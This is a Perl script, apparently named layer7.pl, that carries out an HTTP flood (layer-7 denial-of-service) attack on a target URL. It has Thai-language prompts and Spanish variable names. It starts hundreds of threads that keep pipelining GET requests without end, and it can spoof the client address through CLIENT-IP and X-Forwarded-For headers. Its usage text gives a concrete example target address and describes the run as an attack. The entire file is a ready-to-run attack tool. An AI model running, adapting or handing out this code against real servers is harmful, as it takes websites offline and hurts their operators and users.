#!/usr/bin/perl
package control;
my $ip;
sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}
sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("สุ่ม  Ip!\n") if($a>=255);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}
1;
package main;

use Socket;
use IO::Socket::INET;
use threads ('yield',
                'exit' => 'threads_only',
                'stringify');
use threads::shared;
my $ua =  "NaeLike";

my $method = "GET";
my $hilo;
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
my $randsemilla = "";
for($i = 0; $i < 30; $i++) {
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}


sub sender {
    my ($max,$puerto,$host,$file) = @_;
    my $sock;
    while(true) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
            $paquete .= join "",$method," /",$filepath," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nCLIENT-IP: ",$ipinicial,"\r\nX-Forwarded-For: ",$ipinicial,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $paquete;
    }
}

sub sender2 {
    my ($puerto,$host,$paquete) = @_;
    my $sock;
    my $sumador :shared;
    while(true) {
        $sock = &socker($host,$puerto);
        unless($sock) {
            print "\e[1;34m[\e[1;32mx\e[1;34m]\e[1;32m\n กำลัวโจมตี...\e[0m\n\n";
            next;
        }
        print $sock $paquete;
    }
}

sub comenzar {
    $SIG{'KILL'} = sub { print "\e[1;32mกำลัวโจมตี...\e[0m\n"; threads->exit(); };
    $url = $ARGV[0];
    print "\e[1;34m[\e[1;32m+\e[1;34m]\e[1;32mURL: \e[1;31m".$url."\e[0m\n";
    $max = $ARGV[1];
    $porconexion = $ARGV[2];
    $ipfake = $ARGV[3];
    if($porconexion < 1) {
        print "\e[1;34m[\e[1;32m-\e[1;34m]\e[1;32m...เริ่มการโจมตี...\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die("\e[1;31m[x] รูปแบบ URL ผิด!\n");
    }
    $url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
    ($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
    $puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    print join "","\e[1;34m[\e[1;31m!\e[1;34m]\e[1;32mจำนวนการเชื่อมต่อ\e[0m ","\e[1;31m",$max," \e[1;32mการเชื่อมต่อ!\e[0m\n";
    $file = "/".$file if($file !~ /^\//);
    print join "","\e[1;32mเป่าหมาย: ","\e[1;31m",$host,":",$puerto,"\e[1;32m\nกำลังโจมตีไปที่พาท: ","\e[1;31m",$file,"\e[0m\n\n";
    if($ipfake eq "") {
        my $paquetebase = join "",$method," /",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $porconexion;
        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } else {
        $sumador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender', ($porconexion,$puerto,$host,$file));
        }
    }
    print "\e[1;34m[\e[1;32m-\e[1;34m] \e[1;31m...\e[1;33mEDIT SCRIPT BY UNKNOW\e[0m\e[1;31m...\e[0m\n";
    for($v=0;$v<$max;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
    print "เสร็จสิ้น!\n";
}



if($#ARGV > 2) {
    comenzar();
} else {
    print "\e[1;32m\n______________________________________________________________\n";
	die("______________________________________________________________\n                  \e[1;31m...\e[1;33mEDIT SCRIPT BY UNKNOW\e[0m\e[1;31m...\e[0m \e[1;32m\n______________________________________________________________\nวิธีใช้: layer7.pl [url] [จำนวนการเชื่อมต่อ] [จำนวนการเชื่อมต่อ ต่อการเชื่อมต่อ] [1.1.1.1]\n* [URL]| = http://144.76.38.238/\n* [การเชื่อมต่อ]| = 400\n* [จำนวนการเชื่อมต่อ ต่อการเชื่อมต่อ]| = 100\n* [cf]| = 1.1.1.1\n______________________________________________________________\nตัวอย่าง: layer7.pl http://144.76.38.238/ 400 100 127.0.0.1\n______________________________________________________________\n______________________________________________________________\n");
print "\e[0m\n";

}
